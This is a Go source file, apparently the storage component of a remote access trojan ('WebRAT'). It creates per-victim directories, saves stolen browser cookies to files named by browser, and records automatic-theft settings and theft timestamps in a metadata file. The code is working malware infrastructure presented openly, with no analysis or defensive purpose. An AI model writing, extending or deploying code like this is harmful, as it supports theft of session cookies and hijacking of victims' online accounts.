package stealstore

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"
)

var safeIDRe = regexp.MustCompile(`^[A-Za-z0-9_-]+$`)

func DataDir(victimID string) string {
	victimID = strings.TrimSpace(victimID)
	if victimID == "" || !safeIDRe.MatchString(victimID) {
		victimID = "_invalid_"
	}
	base := strings.TrimSpace(os.Getenv("WEBRAT_STEAL_DIR"))
	if base == "" {
		wd, _ := os.Getwd()
		base = filepath.Join(wd, "steal_data")
	}
	full := filepath.Join(base, victimID)
	if !strings.HasPrefix(full, base+string(filepath.Separator)) && full != base {
		return filepath.Join(base, "_invalid_")
	}
	return full
}

func SaveResult(victimID string, browserName string, cookies string) error {
	if !safeIDRe.MatchString(strings.TrimSpace(victimID)) {
		return fmt.Errorf("invalid victim id: %q", victimID)
	}
	dir := filepath.Join(DataDir(victimID), "Browser")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return err
	}

	bName := strings.ReplaceAll(browserName, " ", "")
	bName = strings.ReplaceAll(bName, "/", "_")
	bName = strings.ReplaceAll(bName, "\\", "_")
	bName = strings.ReplaceAll(bName, "..", "_")
	fname := bName + "Cookies.txt"
	return os.WriteFile(filepath.Join(dir, fname), []byte(cookies), 0o644)
}

func UpdateMeta(victimID, autoSteal string) error {
	dir := DataDir(victimID)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return err
	}

	metaPath := filepath.Join(dir, "meta.json")

	meta := map[string]string{
		"auto_steal": autoSteal,
		"steal_time": time.Now().Format("02.01.2006, 15:04:05"),
	}

	existing, err := os.ReadFile(metaPath)
	if err == nil {
		var old map[string]string
		if json.Unmarshal(existing, &old) == nil {
			if autoSteal == "" && old["auto_steal"] != "" {
				meta["auto_steal"] = old["auto_steal"]
			}
		}
	}

	data, err := json.MarshalIndent(meta, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(metaPath, data, 0o644)
}
